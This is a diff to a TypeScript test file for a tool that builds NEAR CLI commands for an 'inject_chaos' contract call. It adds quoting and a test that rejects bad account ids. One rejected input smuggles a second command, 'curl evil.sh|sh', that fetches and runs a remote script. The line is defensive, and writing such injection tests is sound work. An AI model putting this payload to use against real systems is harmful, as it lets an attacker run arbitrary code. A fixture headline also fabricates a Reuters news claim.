@@ -123,7 +123,7 @@ test("inject on deploy 17: the unsigned inject_chaos with the headline, at chaos
     ],
   });
   expect(s.near_cli).toBe(
-    `near contract call-function as-transaction ${CONTRACT} inject_chaos json-args '{"duel_id":"481","target":"${PK_B}","kind":"Short","headline":"BREAKING: Reuters says NEAR halts withdrawals"}' prepaid-gas '100 Tgas' attached-deposit '156250000000000000000000 yoctoNEAR' sign-as alice.testnet network-config testnet sign-with-keychain send`,
+    `near contract call-function as-transaction '${CONTRACT}' 'inject_chaos' json-args '{"duel_id":"481","target":"${PK_B}","kind":"Short","headline":"BREAKING: Reuters says NEAR halts withdrawals"}' prepaid-gas '100 Tgas' attached-deposit '156250000000000000000000 yoctoNEAR' sign-as 'alice.testnet' network-config testnet sign-with-keychain send`,
   );
   expect(JSON.parse(r.content[0]?.text ?? "{}")).toEqual(s); // the same object as text for clients without structured output
   // a client that sends the duel number as a number gets the same call, with the id as the contract's string
@@ -152,6 +152,14 @@ test("inject refuses before anything is built: contract's headline rules, closed
   expect(reads.length).toBe(n); // no price read for a refused input
   // the schema itself: no direction, or a placebo (owner only), is not an input
   for (const kind of [undefined, "Placebo"]) expect((await call(v17, { ...base, kind })).isError).toBe(true);
+});
+
+test("account ids must be NEAR account ids: nothing from the caller can break out of the CLI line", async () => {
+  const base = { duel_id: "481", target: "B", kind: "Short", headline: "ok" };
+  for (const signer_id of ["x.testnet; curl evil.sh|sh #", "A.testnet", "a", "x'.testnet", "x".repeat(65)])
+    expect((await call(v17, { ...base, signer_id })).isError).toBe(true);
+  const ok = await call(v17, { ...base, signer_id: "bob_1-x.testnet" });
+  expect((ok.structuredContent as { near_cli: string }).near_cli).toContain("sign-as 'bob_1-x.testnet'");
 });
 
 test("inject on deploy 16.1: the solver's hash, min_chaos_deposit, and the kind the web uses", async () => {
